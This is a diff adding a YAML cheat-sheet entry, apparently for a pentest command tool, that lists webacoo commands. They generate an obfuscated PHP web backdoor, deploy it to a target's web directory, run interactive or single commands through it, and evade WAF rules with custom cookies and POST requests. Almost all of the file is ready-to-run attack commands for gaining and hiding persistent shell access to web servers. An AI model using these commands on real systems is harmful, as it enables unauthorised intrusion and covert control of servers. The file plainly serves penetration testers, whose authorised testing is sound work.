@@ -1,0 +1,39 @@
+tool: webacoo
+tags: [web, pentest, backdoor, post-exploitation, c2]
+
+actions:
+ - title: webacoo - generate backdoor
+   desc: |
+     Generates an obfuscated PHP backdoor using system() by default.
+     Deploy the output file to the target web directory for access.
+   command: "webacoo -g -o {{output|backdoor.php}}"
+
+ - title: webacoo - generate with shell_exec
+   desc: |
+     Generates the backdoor using shell_exec instead of system.
+     Use when system() is disabled in php.ini on the target.
+   command: "webacoo -g -f 2 -o {{output|backdoor.php}}"
+
+ - title: webacoo - generate raw backdoor
+   desc: |
+     Outputs the backdoor code without obfuscation for review.
+     Handy to inspect what will run on the target before deploying.
+   command: "webacoo -g -f {{func_num|1}} -o {{output|backdoor.php}} -r"
+
+ - title: webacoo - terminal session
+   desc: |
+     Opens an interactive terminal through the deployed backdoor URL.
+     Cookie-based channel blends commands into normal HTTP traffic.
+   command: "webacoo -t -u {{url|http://target/backdoor.php}}"
+
+ - title: webacoo - single command exec
+   desc: |
+     Runs one command through the backdoor without an interactive session.
+     Best for scripting or one-shot checks during post-exploitation.
+   command: "webacoo -t -u {{url|http://target/backdoor.php}} -e {{command|id}}"
+
+ - title: webacoo - custom cookie and method
+   desc: |
+     Connects using a custom cookie name and POST method for evasion.
+     Non-default names and POST blend better past naive WAF rules.
+   command: "webacoo -t -u {{url|http://target/backdoor.php}} -m POST -c {{cookie|M-cookie}}"
